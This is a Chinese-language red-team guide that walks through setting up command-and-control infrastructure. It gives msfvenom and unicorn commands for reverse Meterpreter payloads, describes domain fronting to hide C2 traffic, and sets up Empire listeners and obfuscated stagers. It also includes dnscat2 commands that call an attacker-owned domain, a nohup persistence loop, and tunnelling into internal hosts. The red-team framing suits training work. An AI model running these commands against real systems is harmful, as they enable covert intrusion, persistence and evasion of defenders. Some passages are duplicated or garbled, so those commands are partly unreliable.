
# 赛前准备

[ATT & CK 矩阵 - attack-navigator](https://mitre-attack.github.io/attack-navigator/enterprise/)

[ATT & CK 矩阵 - Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/)

[ATT & CK 矩阵具体技术](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/windows-index.md)

[APT组织与方法持续更新列表 - 参考此文档可以模拟不同的攻击](https://docs.google.com/spreadsheets/d/1H9_xaxQHpWaa4O_Son4Gx0YOIzlcBWMsdvePFX68EKU/edit#gid=361554658)

## 假定攻破联系（assumed breach exercise）

然而事实是， 如今太多的公司认为通过一些所谓的安全配置或者年度渗透测试， 它们是安全的。我们需要进入一种思维状态， 我们总是蹲守， 假设邪恶就潜伏在周围， 我们需要时刻寻找异常。

> 红队与渗透测试的区别

红队的重心是检测、给出措施，而不太是漏洞。

## 设定你的行动

 - 确定活动范围。
 - 不断尝试目标。
 - 专注某个网络。

目标：

- 最终目标是什么？APT检测？获取标志？获取数据？得到检测时效（TTD）指标。
- 是否有想要复制的公开活动。
- 用什么技巧？MITRE ATT&CK矩阵，ATT&CK使用的矩阵是什么？
- 需使用什么工具？


## 设置外部服务器（VPS）

- 如何保障VPS服务器的安全性
    - 建立iptables规则
    - 限制SSH的登录地点和ip

[Red-Baron环境](https://github.com/Coalfire-Research/Red-Baron)为红队自动创建有弹性、一次性、安全和灵活的基础设置。

[Red-Baron wiki](https://github.com/coalfire/pentest-red-baron/wiki)

## 红队的核心工具

### 1、metasploit框架

混淆 Meterpreter 的 Payload

使用 PowerShell 进行模糊处理：

```shell
msfvenom --payload windows/x64/meterpreter_reverse_http --format psh -out meterpreter-64.ps1 LHOST=192.168.15.132
```

![msfvenom generate payload](https://raw.githubusercontent.com/olist213/olistimg/master/olist213/1578062731122.png)

```shell
root@thp3:/opt/unicorn# python unicorn.py windows/meterpreter/reverse_https 192.168.15.132 443
```
![unicorn](https://raw.githubusercontent.com/olist213/olistimg/master/olist213/1578062763828.png)

在当前目录下生成两个文件。

![payload文件](https://raw.githubusercontent.com/olist213/olistimg/master/olist213/1578062803974.png)

将 powershell_attack.txt中的代码放到受害者的powershell中执行，在攻击者的机器上通过root@thp3:/opt/unicorn# msfconsole -r unicorn.rc进行监听。

![监听](https://raw.githubusercontent.com/olist213/olistimg/master/olist213/1578063543485.png)

## Cobalt Strike


它是一种用来后期持久渗透， 横向移动， 流量隐藏、 数据窃取的工具。

Cobalt Strike 并没有直接的漏洞利用， 也没有通过最新的 0-Day 漏洞来破坏系统。 当你已经在服务器上执行了 CS 的恶意代码或者将 CS 用作网络钓鱼活动的一部分时， 你就能感受到 CS 的功能是多么广泛并且强大。

### Cobalt Strike 基础设施


Cobalt Strike 支持重定向， 当你的 Cobalt Strike 使用的 C2 域名被销毁了， 你不需要创建并启用一个新的环境， 只需要替换一个新的 C2 域名。

![Cobalt Strike C2域名](https://raw.githubusercontent.com/olist213/olistimg/master/olist213/1578063582992.png)


域名前置（域名幌子）：使用其他的域名和基础设置作为控制器重定向的技术集合，通过使用CNDs来实现，隐蔽流量源。

参考链接：

[high-reputation-redirectors-and-domain-fronting](https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/)

[Threat Research APT29 Domain Fronting With TOR](https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html)


通过使用这些高信誉的域名，无论任何流量，看起来都像在正常通信。

如何实现：

用一个比较抽象的例子来说，你的所有流量将被发送到 CloudFront 的
一个主要完全限定域名(FQDNs)，例如 a0.awsstatic.com，它是 CloudFront 的主要域名。修改请求中的主机header，将把所有流量重定向到我们的 CloudFront 分发(CloudFront distribution)，后者最终会将流量转发到我们的Cobalt Strike C2服务器上。参考链接如上。

![流量转发图形化](https://raw.githubusercontent.com/olist213/olistimg/master/olist213/1578064012995.png)

通过更改 HTTP 主机的 header，CDN 将很轻松的的的地把流量传输回到正确的服务器。红队一直使用这种技术通过使用高信誉域名来隐藏 C2 服务器的流量。


通过更改 HTTP 主机的 header， CDN 将很轻松的的地把流量传输回到正确的服务器。 红队一直使用这种技术通过使用高信誉域名来隐藏 C2 服务器的流量。

Cobalt Strike 支持内网主机之间使用基于 SMB 的 Beacon 来进行交互。 这允许你让一台受感染的计算机与你的C2 服务器进行正常且合适的 beacon 连接， 并使内部网络上的所有其他的服务器通过 SMB协议与最初受感染的主机进行通信。

Cobalt Strike 可以操纵你的 Beacon 通信， 这对红队成员来说是一个非常有用的特性。 使用自定义 C2 配置文件， 你可以让所有来自受感染主机系统的流量看起来和普通流量无异。

现在很多红队已经在许多不同的活动中使用了这些配置文件， 许多安全厂商已经给所有常见的自定义配置文件创建了[指纹签名](https://github.com/rsmudge/Malleable-C2-Profiles)。 为了解决这个问题， 我们能做的是: 确保修改了配置文件中的所有静态字符串， 确保更改了所有 User-Agent 信息， 使用真实的证书配置 SSL（ 不要使用 Cobalt Strike 默认的 SSL 证书） ， 调整抖动率， 并更改客户端的的 beacon 时间。

SpectorOps 安全团队还创建了可定制混淆 C2 配置文件的[项目](https://github.com/bluscreenofjeff/Malleable-C2-Randomizer)。

Cobalt Strike 的 Aggressor 脚本

Aggressor 脚本是一种面向红队操作和对手模拟的脚本语言， 其灵感来源于可脚本化的 IRC 客户端和机器人。

1. 你可以创建长时间运行的机器人来模拟虚拟红队成员， 并与你并肩进行黑客攻击
2. 你还可以根据你的需要使用它来扩展和修改 Cobalt Strike 客户端的功能

## PowerShell Empire

Empire 是一个后期漏洞利用的框架， 包含一个纯 PowerShell2.0 的 Windows 代理和一个纯Python 2.6/2.7 的 Linux/OS X 代理。

在 PowerShell 方面， Empire 实现了无需 powershell.exe 就可运行 PowerShell 代理的功能。 并且 Empire 有很多可以快速部署的后期漏洞利用模块， 从键盘记录器到 Mimikatz。 Empire 还可以调整通信， 躲避网络检测。 所有的这些功能都封装在一个以实用性为重点的[框架](https://github.com/EmpireProject/Empire)中。

**对于红队人员来说， PowerShell 是我们最好的朋友之一。 在初始化有效 payload 之后， 所有随后的攻击都保存在内存中。**

在设置 Empire 方面， 确保你已安全地配置它非常重要：

 - 将证书路径 CertPath 设置为一个真实可信的 SSL 证书。
 - 更改 DefaultProfile 端点。许多第7层防火墙都在寻找确切的静态端点。
 - 更改用于通信的用户代理。


运行Empire：

 - 初始化Empire
     - cd /opt/Empire && ./setup/reset.sh
- 退出
    - exit
- 安装证书（ 最好是使用真实受信任的证书）
    - ./setup/cert.sh
- 开始运行Empire
    - ./empire
- 创建监听器
    - listeners
- 选择你的监听器类型
    - (Empire: listeners) > uselistener http
- 查看监听器的所有配置信息
    - info
 - 设置一下内容（ 即设置KillDate 12/12/2020）
    - KillDate - 规定一个结束时间然后自动清理代理
     - DefaultProfile - 确保更改所有端点（ 即/admin/get.php,/news.php） 。 你可以根据需要制作它们， 例如/s
     - eriously/notmalware.php
     - DefaultProfile - 确保也更改你的用户代理。 我一般是查看使用过的顶级用户代理并选择从中选择一个。
     - Host - 更改为通过端口443的 HTTPS
     - CertPath - 添加 SSL 证书的路径
     - UserAgent - 将其更改为你的常用用户代理
     - Port - 设置为443
     - ServerVersion - 将其更改为另一个常见的服务器 Header
 - 当完成这些操作，开启监听器
    - execute

![info](https://raw.githubusercontent.com/olist213/olistimg/master/olist213/1578064917719.png)

![execute](https://raw.githubusercontent.com/olist213/olistimg/master/olist213/1578064930982.png)

配置payload

payload 是将在受害者系统上运行的实际恶意软件。

 - 进入主菜单
    - main
 - 为 OSX， Windows， Linux 创建可用的 stager。 我们将创建一个简单的 bat 文件作为示例， 但实际上你可以为 Office 文件创建宏或者为一个 USB 橡皮鸭创建 payload
    - (Empire) > usestager windows/launcher_bat

    - (Empire: stager/windows/launcher_bat) >

 - 查看所有设置
    - info

 - 配置所有setting
     - (Empire: stager/windows/launcher_bat) > set Listener http
 - 创建payload
     - generate

在另一终端查看payload

![查看混淆的payload](https://raw.githubusercontent.com/olist213/olistimg/master/olist213/1578065059325.png)


如你所见， 创建的 payload 被严重混淆。 你现在可以把这个 .bat 文件丢到任何 Windows 系统上。

这里用win7.

直接将代码复制到目标机器执行。

![执行代码](https://raw.githubusercontent.com/olist213/olistimg/master/olist213/1578065092383.png)


**
在kali上安装powershell

```shell
apt-get install libunwind8
wget http://security.debian.org/debian-security/pool/updates/main/o/openssl/libssl1.0.0_1.0.1t-1+deb7u3_amd64.deb
dpkg -i libssl1.0.0_1.0.1t-1+deb7u3_amd64.deb
wget http://security.ubuntu.com/ubuntu/pool/main/i/icu/libicu55_55.1-7ubuntu0.3_amd64.deb
dpkg -i libicu55_55.1-7ubuntu0.3_amd64.deb
wget https://github.com/PowerShell/PowerShell/releases/download/v6.0.2/powershell_6.0.2-1.ubuntu.16.04_amd64.deb
dpkg -i powershell_6.0.2-1.ubuntu.16.04_amd64.deb**
```

## dnscat2

内网出口一般对出站流量做了严格限制，但是通常不会限制DNS请求，也就是UDP53请求。dnscat2就是一款利用DNS协议创建加密C2隧道来控制服务器的工具， 所以说这种隧道几乎在每个网络中都可以使用。 dnscat2 由客户端和服务端两部分组成。

许多受保护的网络包含一个 DNS 服务器来解析内部主机， 同时还允许解析外部资源。 通过为我们拥有的恶意域名设置一个权威服务器， 我们可以利用这些 DNS 解析来对我们的恶意软件进行命令执行和控制。**strong text**

![dnscat2](https://raw.githubusercontent.com/olist213/olistimg/master/olist213/1578065155565.png)

> 如何使用

- 在域名提供商处将域名指向攻击VPS服务器的IP
- 添加自定义NS记录
- 设置并初始化dnscat2服务器

```shell
sudo su -
apt-get update
apt-get install ruby-dev
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
apt-get install gcc make
gem install bundler
bundle install
请测试确认以下脚本能够正常运行: ruby ./dnscat2.rb
```

- 编译客户端

```shell
git clone https://github.com/iagox86/dnscat2.git /opt/dnscat2/client
cd /opt/dnscat2/client/
make
我们现在应该创建一个 dnscat 二进制文件！
(如果你在 windows 环境下编译，需要将 client/win32/dnscat2.vcproj 加载到 Visual Studio 并点击
“build” )
```

现在我们已经配置好了权威 DNS，我们的攻击服务器作为一个 DNS 服务器正在运行 dnscat2，并且我们已经编译了
恶意软件。

在攻击服务器上启动dnscat2，将loca1host.com替换成我们拥有的域名，并配置secret标志，为secret创建随机密钥字符串。

```shell
screen
ruby ./dnscat2.rb loca1host.com —secret 39dfj3hdsfajh37e8c902j
```

假如受攻击的服务器上存在RCE(命令执行漏洞)，则可以运行shell命令并上传编译好的dnscat2客户端payload，执行payload。

```shell
./dnscat loca1host.com —secret 39dfj3hdsfajh37e8c902j
```

这将在目标机器中启动 dnscat，域名查询使用了我们自定义的的权威服务器，从而创建我们的 C2 通道。 

> 快速启动,这将确保如果客户端 payload 进程因任何原因而挂掉了，它将每小时生成一个新的实例。

```shell
nohup /bin/bash -c “while true; do /opt/dnscat2/client/dnscat loca1host.com -secret
9dfj3hdsfajh37e8c902j -max-retransmits 5; sleep 3600; done” > /dev/null 2>&1 
```

[dnscat2 powershell](https://github.com/lukebaggett/dnscat2-powershell)

- dnscat2的连接

在我们的 payload 执行并连接回我们的攻击服务器之后，我们应该看到类似于下面的一个新的 ENCRYPTED AND
VERIFIED 消息。

> 显示会话

```
windows
```

> 会话交互

```
windows -i 1
```

> 启动shell会话

```
shell
```

> 回到主会话

```
ctrl + z
```

> dnscat2隧道

我们有很多时候想要将来自攻击服务器的流量通过我们的受感染主机传递到其他内部服务器。

```shell
listen 127.0.0.1:9999 10.100.100.1:22
```

创建隧道后，我们可以返回攻击计算机上的根终端窗口，通过本地的 9999 端口使用 SSH 连接到 localhost，然后成
功连接到受害者网络上的内部系统并进行身份验证。

[使用SSH反向隧道进行内网穿透](http://arondight.me/2016/02/17/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/)

[Nishang ICMP shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1)

> 其他ICMP shell

 - https://github.com/jamesbarlow/icmptunnel
 - https://github.com/DhavalKapil/icmptunnel
 - http://code.gerade.org/hans/

## p0wnedShell

正如 [p0wnedShell](https://github.com/Cn33liz/p0wnedShell) 的 Github 页面所述， 这个工具是“用 C＃ 编写的进攻型 PowerShell 主机应用程序， 它不依赖于 powershell.exe， 而是在 powershell 运行空间环境（ .NET） 中运行powershell 命令和函数。

你可以利用p0wnedShell 来在活动目录环境中执行现代化的攻击， 并在你的蓝队中创建意识， 以帮助他们构建正确的防御策略。 ”


## Pupy Shell

[Pupy](https://github.com/n1nj4sec/pupy) 是“一个开源， 跨平台（ Windows， Linux， OSX， Android） 的远程管理和后渗透利用工具， 主要用python编写”。

## PoshC2

[PoshC2](https://github.com/nettitude/PoshC2) 是一个代理感知型 C2 框架， 完全用 PowerShell 编写， 以帮助渗透测试人员进行红队合作， 后渗透利用和横向移动。

## Merlin

[Merlin](https://github.com/Ne0nd0g/merlin) 利用最近开发的名为 HTTP/2 (RFC7540) 的协议。 “HTTP/2 的通信是多路复用的双向连接， 在一个请求和响应之后不会结束。

Merlin 是一个用 GO 编写的工具， 外观和感觉类似于 PowerShell Empire， 并且允许使用轻量级代理。

## Nishang

[Nishang](https://github.com/samratashok/nishang) 是一个脚本和 payload 的框架和集合， 可以使用 PowerShell 进行进攻型安全测试，渗透测试和红队测试。 Nishang 在渗透测试的所有阶段都很有用。
